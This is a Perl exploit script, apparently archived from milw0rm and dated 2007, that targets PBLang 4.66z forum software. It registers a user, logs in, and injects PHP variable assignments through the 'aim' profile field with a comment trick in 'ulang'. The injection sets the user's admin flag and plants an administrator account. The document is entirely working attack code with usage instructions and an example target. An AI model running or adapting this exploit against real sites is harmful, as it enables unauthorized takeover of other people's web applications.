#!/usr/bin/perl
# PBlang 4.66z Create Admin Exploit
# this exploit *register* a user with admin access
### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;

 print q(
 ###########################################################
 #            PBLANG 4.66z Create Admin Exploit            #
 #                    www.Hessamx.Net                      #
 ################# (C)oded By Hessam-x #####################

);



 if (@ARGV < 3) {
 print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
 print " #  e.g : xpl.pl www.milw0rm.com/pblang/ str0ke 123456\n";
 exit();
 }

   print " [~] User/Password : $uname/$passwd \n";
   print " [~] Host : $host \n";

 $evilcode  = " \$userlocation=\"hell\"; \$userjoined=\"1174733561\"; \$userhomepage=\"http://\";";
 $evilcode .= " \$useradmin=\"1\"; \$usermod=\"0\"; \$userban=\"0\"; \$userlastvisit=\"1174733561\";";
 $evilcode .= " \$userlastpost=\"1174733561\"; \$userprevvisit=\"1174733561\"; \$useranimsmilies=\"\"; \$lastaliaschange=\"1174733549\"; /*";

 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );

   #register
 $reg = $xpl->post($url.'register.php?reg=2',
 Content => [
 "user" => $uname,
 "pass" => $passwd,
 "pass2" => $passwd,
 "em" => 'evil@hell.com',
 "realname" => 'evilcode',
 "alias" => $uname,
 "msn" => 'evilcode',
 "icq" => 'evilcode',
 "aim" => 'evilcode',
 "yahoo" => 'evilcode',
 "qq" => 'evilcode',
 "web" => 'http://',
 "loc" => 'hell',
 "pt" => 'PBLang',
 "av" => 'none',
 "webav" =>'',
 "sig" => 'be Safe',
 "regcode" => '9999999999',
 "lang" => 'en',
 "accept" => '1',
 "Submit" => 'Submit',
 ],);
   print " [~] registered ... \n";

$login = $xpl->post($url.'login.php?id=2',
Content => [
'user' => $uname,
'pass' => $passwd,
'Submit' => 'submit',
],);
$setcookie = $xpl->post($url.'setcookie.php?u='.$uname);
 if($cookie_jar->as_string =~ /$uname/) {
   print " [~] Logined ... \n";
 } else {
 print " [-] Can not Login In $host !\n";
 exit();
 }
 $ecode = $xpl->post($url.'ucp.php?id=2&user='.$uname,
 Content => [
 "npass" => $passwd,
 "npass2" => $passwd,
 "oldpass" => $passwd,
 "emhide" => 'hide',
 "user" => $uname,
 "em" => 'evil@hell.com',
 "realname" => 'evilcode',
 "alias" => $uname,
 "msn" => 'evilcode',
 "icq" => 'evilcode',
 "aim" => 'evilcode\";'.$evilcode,
 "yah" => 'evilcode',
 "qq" => 'evilcode',
 "web" => 'http://',
 "loc" => 'hell',
 "pt" => 'PBLang',
 "av" => 'none',
 "webav" =>'',
 "sig" => '',
 "regcode" => '1174733482',
 "ulang" => '*/ \$userlang=\"en\"; //',
 "accept" => '1',
 "Submit2" => 'Submit',
 ],);


print " [+] You Are Admin Now !!";
print "\n #################################################### \n";

# milw0rm.com [2007-03-25]
